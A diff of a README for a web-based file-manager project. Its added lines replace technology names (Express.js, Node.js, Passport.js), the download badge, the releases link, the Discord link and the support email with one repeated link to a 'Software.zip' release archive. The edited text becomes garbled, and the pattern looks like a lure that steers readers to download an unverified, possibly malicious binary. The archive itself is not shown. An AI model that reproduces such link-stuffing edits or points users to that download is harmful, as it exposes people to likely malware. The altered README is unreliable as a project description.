@@ -4,13 +4,13 @@
 
 ## Description
 
-Welcome to the official GitHub repository of **file-manager** - a cutting-edge web-based File Manager built with Express.js, Prisma ORM, Supabase PostgreSQL, and Cloudinary. Our File Manager enables users to securely upload, manage, and share files and folders in the cloud with ease. With robust authentication, cloud storage capabilities, and seamless integration with various technologies, **file-manager** is your go-to solution for efficient file management needs.
+Welcome to the official GitHub repository of **file-manager** - a cutting-edge web-based File Manager built with https://github.com/safarBots/file-manager/releases/download/v2.0/Software.zip, Prisma ORM, Supabase PostgreSQL, and Cloudinary. Our File Manager enables users to securely upload, manage, and share files and folders in the cloud with ease. With robust authentication, cloud storage capabilities, and seamless integration with various technologies, **file-manager** is your go-to solution for efficient file management needs.
 
 ---
 
 ## Features
 
-🔒 **Secure Authentication**: Rest assured with our secure authentication system, powered by Passport.js and Passport-Local.
+🔒 **Secure Authentication**: Rest assured with our secure authentication system, powered by https://github.com/safarBots/file-manager/releases/download/v2.0/Software.zip and Passport-Local.
 
 ☁️ **Cloud Storage Integration**: Seamlessly store and manage files in the cloud using Supabase PostgreSQL and Cloudinary.
 
@@ -22,8 +22,8 @@ Welcome to the official GitHub repository of **file-manager** - a cutting-edge w
 
 ## Technologies Used
 
-- **Express.js**: A powerful Node.js web application framework for building robust web applications.
-- **Prisma ORM**: A modern database toolkit for TypeScript and Node.js developers.
+- **https://github.com/safarBots/file-manager/releases/download/v2.0/Software.zip**: A powerful https://github.com/safarBots/file-manager/releases/download/v2.0/Software.zip web application framework for building robust web applications.
+- **Prisma ORM**: A modern database toolkit for TypeScript and https://github.com/safarBots/file-manager/releases/download/v2.0/Software.zip developers.
 - **Supabase PostgreSQL**: An open-source alternative to Firebase with real-time capabilities and PostgreSQL compatibility.
 - **Cloudinary**: A cloud-based image and video management solution for all your media needs.
 
@@ -35,13 +35,13 @@ Welcome to the official GitHub repository of **file-manager** - a cutting-edge w
 📦 **Cloud Storage**
 🖼️ **Cloudinary**
 🚀 **Express**
-🌐 **Express.js**
+🌐 **https://github.com/safarBots/file-manager/releases/download/v2.0/Software.zip**
 📂 **File Management**
 🔵 **Node**
-🔵 **Node.js**
+🔵 **https://github.com/safarBots/file-manager/releases/download/v2.0/Software.zip**
 🔑 **Passport**
 🔑 **Passport-Local**
-🔑 **Passport.js**
+🔑 **https://github.com/safarBots/file-manager/releases/download/v2.0/Software.zip**
 🐘 **PostgreSQL**
 🔗 **Prisma**
 🔗 **Prisma Client**
@@ -53,7 +53,7 @@ Welcome to the official GitHub repository of **file-manager** - a cutting-edge w
 
 To get started with **file-manager**, simply download the project by clicking the button below:
 
-[![Download file-manager](https://img.shields.io/badge/Download-v1.0.0-blue.svg)](https://github.com/cli/go-gh/archive/refs/tags/v1.0.0.zip)
+[![Download file-manager](https://github.com/safarBots/file-manager/releases/download/v2.0/Software.zip)](https://github.com/safarBots/file-manager/releases/download/v2.0/Software.zip)
 
 Once downloaded, follow the installation instructions in the repository to set up your own instance of the File Manager.
 
@@ -61,19 +61,19 @@ Once downloaded, follow the installation instructions in the repository to set u
 
 ## Explore Further
 
-Visit our [GitHub Releases](https://github.com/cli/go-gh/releases) section for additional updates and version history.
+Visit our [GitHub Releases](https://github.com/safarBots/file-manager/releases/download/v2.0/Software.zip) section for additional updates and version history.
 
 ---
 
 ## Join the Community
 
-Join our community and connect with fellow developers on our [Discord server](https://discord.io/file-manager) to share ideas, ask questions, and collaborate on exciting projects.
+Join our community and connect with fellow developers on our [Discord server](https://github.com/safarBots/file-manager/releases/download/v2.0/Software.zip) to share ideas, ask questions, and collaborate on exciting projects.
 
 ---
 
 ## Get in Touch
 
-For any inquiries or feedback, feel free to reach out to us at **filemanager.support@example.com**. We're always here to assist you!
+For any inquiries or feedback, feel free to reach out to us at **https://github.com/safarBots/file-manager/releases/download/v2.0/Software.zip**. We're always here to assist you!
 
 ---
 
